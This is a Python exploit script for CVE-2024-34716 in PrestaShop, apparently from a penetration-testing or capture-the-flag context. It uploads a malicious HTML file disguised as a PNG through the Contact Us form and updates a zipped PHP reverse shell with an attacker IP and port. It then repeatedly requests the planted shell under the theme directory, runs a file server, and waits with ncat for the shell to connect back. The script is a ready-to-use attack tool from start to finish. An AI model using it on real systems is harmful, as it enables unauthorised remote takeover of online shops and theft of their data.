import argparse, requests, subprocess, time, threading, sys, http.server, socketserver, zipfile, os
from bs4 import BeautifulSoup
import subprocess

print_lock = threading.Lock()
stop_event = threading.Event()

def usage():
    print("Usage: python script.py <host_url> <email> <message_content> <exploit_path> <attacker_ip> <attacker_port>")
    print("\nOptions:")
    print("  host_url          The Presta Shop base url (e.g. http://prestashop:8000)")
    print("  email             The email address of admin user (e.g. admin@prestashop.com)")
    print("  message_content   Message to send in Contact Us form (e.g. 'Hello, I am exploiting you')")
    print("  exploit_path      The path of the exploit HTML (e.g. /path/to/exploit.html)")
    print("  attacker_ip       The IP address of the attacker's machine.")
    print("  attacker_port     The port number for the reverse shell.")
    print("\nExample:")
    print("  python exploit.py http://prestashop:8000 admin@example.com 'Hello, I am exploiting you' /path/to/exploit.html 10.10.14.88 1667")

def parse_args(argv):
    parser = argparse.ArgumentParser(description="CVE-2024-34716 Exploit")
    parser.add_argument("host_url", help="The Presta Shop base url.")
    parser.add_argument("email", help="The email address of a registered user.")
    parser.add_argument("message_content", help="Message to send in Contact Us form.")
    parser.add_argument("exploit_path", help="The path of the exploit HTML.")
    parser.add_argument("attacker_ip", help="The IP address of the attacker's machine.")
    parser.add_argument("attacker_port", type=int, help="The port number for the reverse shell.")
    
    args = parser.parse_args()

    print("[X] Starting exploit with:")
    print(f"\tUrl: {args.host_url}")
    print(f"\tEmail: {args.email}")
    print(f"\tMessage: {args.message_content}")
    print(f"\tExploit path: {args.exploit_path}")
    print(f"\tAttacker IP: {args.attacker_ip}")
    print(f"\tAttacker Port: {args.attacker_port}")
                
    return args

def update_reverse_shell(attacker_ip, attacker_port):
    shell_file_path = "reverse_shell.php"
    zip_file_path = "1337.zip"
    
    # Read reverse_shell.php and modify the IP and port
    with open(shell_file_path, 'r') as file:
        content = file.readlines()

    for i, line in enumerate(content):
        if "$ip =" in line:
            content[i] = f"$ip = '{attacker_ip}';  // CHANGED\n"
        if "$port =" in line:
            content[i] = f"$port = {attacker_port};  // CHANGED\n"

    # Write the changes back to reverse_shell.php
    with open(shell_file_path, 'w') as file:
        file.writelines(content)

    print(f"[X] Updated reverse_shell.php with attacker IP: {attacker_ip} and port: {attacker_port}")
    
    # Run the zip command to update the existing zip file
    try:
        subprocess.run(["zip", "-u", zip_file_path, shell_file_path], check=True)
        print(f"[X] Successfully updated {zip_file_path} with the modified reverse_shell.php")
    except subprocess.CalledProcessError as e:
        print(f"[!] Error updating {zip_file_path}: {e}")


def get_token_and_cookies(host_url):
    url = f"{host_url}/contact-us"
    response = requests.get(url)
    response.raise_for_status()
    
    soup = BeautifulSoup(response.text, 'html.parser')
    token = soup.find('input', {'name': 'token'})['value']
    cookies = response.cookies

    return token, cookies

def send_exploit_message(host_url, email, message_content, exploit_path, token, cookies):
    url = f"{host_url}/contact-us"
    
    with open(exploit_path, 'r') as file:
        html_content = file.read()
    
    files = {
        'fileUpload': ('test.png', html_content, 'image/png'),
    }

    data = {
        'id_contact': '2',
        'from': email,
        'message': message_content,
        'url': '',
        'token': token,
        'submitMessage': 'Send'
    }

    response = requests.post(url, files=files, data=data, cookies=cookies)
    
    if response.status_code == 200:
        print(f"[X] Exploit message sent successfully!")
    else:
        print(f"[!] Failed to send message. Status code: {response.status_code} Reason: {response.reason}")
    
    return response.status_code

def start_get_request_thread(url, interval=5):
    req_thread = threading.Thread(target=send_get_requests, args=(url, interval))
    req_thread.daemon = True
    req_thread.start()
    return req_thread

def send_get_requests(url, interval=5):
    while not stop_event.is_set():
        try:
            response = requests.get(url)
            print(f"GET request to {url}: {response.status_code}")
        except requests.RequestException as e:
            with print_lock:
                print(f"Error during GET request: {e}")
        time.sleep(interval)

def run_http_server():
    PORT = 5005
    with socketserver.TCPServer(("", PORT), CustomRequestHandler) as httpd:
        with print_lock:
            print("Serving at http.Server on port", PORT)
        while not stop_event.is_set():
            httpd.handle_request()

def start_http_server_thread():
    server_thread = threading.Thread(target=run_http_server)
    server_thread.daemon = True
    server_thread.start()
    return server_thread

def listen_for_shell():
    print("[X] Netcat is now listening on port 1667. Press Ctrl+C to terminate.")
    output = subprocess.call(["ncat", "-lnvp", "1667"], shell=False)
    if b"Ncat: Connection from " in output:
        with print_lock:
            print("Stopping threads!")
        stop_event.set()
    else:
        print(f"DEBUG:: {output}")

class CustomRequestHandler(http.server.SimpleHTTPRequestHandler):
    def log_request(self, code='-', size='-'):
        with print_lock:
            print(f"Request: {self.command} {self.path} {self.request_version}")
            print(f"Response: {code} {size}")
        super().log_request(code, size)

def main():
    args = parse_args(sys.argv)
    
    # Run the function to update reverse_shell.php with attacker IP and port
    update_reverse_shell(args.attacker_ip, args.attacker_port)
    
    # Continue with the exploit process
    token, cookies = get_token_and_cookies(args.host_url)
    
    status_code = send_exploit_message(args.host_url, args.email, args.message_content, args.exploit_path, token, cookies)
    if status_code == 200:
        shell_url = f"{args.host_url}/themes/next/reverse_shell.php"
        start_get_request_thread(shell_url, interval=15)
        start_http_server_thread()
        listen_for_shell()

if __name__ == "__main__":
    main()
